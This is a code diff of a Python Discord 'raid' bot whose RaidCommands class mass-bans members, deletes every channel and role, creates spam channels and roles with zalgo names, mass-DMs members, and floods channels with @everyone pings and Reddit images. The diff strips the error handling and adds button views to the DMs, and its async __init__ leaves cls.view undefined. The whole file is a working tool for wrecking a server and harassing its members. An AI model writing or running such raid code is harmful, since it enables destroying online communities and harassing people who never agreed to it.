@@ -4,6 +4,8 @@ import asyncpraw
 import disnake
 import scripting as SC
 from py_logs import client_id, client_secret, user_agent, username, password
+from disnake import Guild, Message, Member
+from disnake.ui import View, Button
 
 reddit = asyncpraw.Reddit(
     client_id=client_id,
@@ -37,87 +39,66 @@ async def genreddit(amt: int, subreddit: str, subreddit2: str = None):
 
 
 class RaidCommands:
+    async def __init__(self):
+        view = View()
+
     @classmethod
-    async def send_dm(cls, guild: disnake.Guild, embed):
-        for mem in guild.members:
-            try:
-                await DMChannel.send(mem, embed=embed)
-            except:
-                pass
-            try:
-                await mem.ban()
-            except:
-                pass
+    async def send_dm(cls, guild: disnake.Guild, embed, button: Button = None):
+
+        if button is not None:
+            cls.view.add_item(button)
+
+            for mem in guild.members:
+                await mem.send(embed=embed, view=cls.view)
+        else:
+            for mem in guild.members:
+                await mem.send(embed=embed)
 
     @classmethod
     async def ban_members(cls, guild: disnake.Guild, author: disnake.Member = None):
         for mem in guild.members:
             if mem is not author:
-                try:
-                    await guild.ban(mem)
-                except:
-                    pass
+                await mem.ban()
 
     @classmethod
     async def channel_remove(cls, guild: disnake.Guild):
         for ch in guild.channels:
-            try:
-                await ch.delete()
-            except:
-                pass
+            await ch.delete()
 
     @classmethod
     async def channel_make(cls, guild: disnake.Guild, amt: int):
         for _ in range(amt):
-            try:
-                await guild.create_text_channel(random.choice(zalgo_list))
-            except:
-                pass
+            await guild.create_text_channel(random.choice(zalgo_list))
 
     @classmethod
     async def role_remove(cls, guild: disnake.Guild):
         for role in guild.roles:
-            try:
-                await role.delete()
-            except:
-                pass
+            await role.delete()
 
     @classmethod
     async def role_make(cls, guild: disnake.Guild, amt: int):
         for _ in range(amt):
-            try:
-                await guild.create_role(name=random.choice(zalgo_list))
-            except:
-                pass
+            await guild.create_role(name=random.choice(zalgo_list))
 
     @classmethod
     async def role_give(cls, guild: disnake.Guild):
         for member in guild.members:
             for role in guild.roles:
-                try:
-                    await member.add_roles(role)
-                except:
-                    pass
+                await member.add_roles(role)
 
     @classmethod
     async def sfw_spam(cls, guild: disnake.Guild, amt: int):
         for _ in range(amt):
             for cha in guild.channels:
-                try:
-                    sfw_post = random.choice(sub_list)
-                    embed = disnake.Embed(title=f"__{sfw_post.title}__", url=sfw_post.url)
-                    embed.set_image(url=sfw_post.url)
-                    await cha.send(embed=embed)
-                except:
-                    pass
-                if len(sub_list) < 5:
-                    await genreddit(10, subreddit)
+                sfw_post = random.choice(sub_list)
+                embed = disnake.Embed(title=f"__{sfw_post.title}__", url=sfw_post.url)
+                embed.set_image(url=sfw_post.url)
+                await cha.send(embed=embed)
+            if len(sub_list) < 5:
+                await genreddit(10, subreddit)
 
     @classmethod
     async def ping_spam(cls, guild: disnake.Guild, amt):
         for _ in range(amt):
             for cha in guild.channels:
-                try:
-                    await cha.send(guild.default_role)
-                except:
-                    pass
+                await cha.send(guild.default_role)
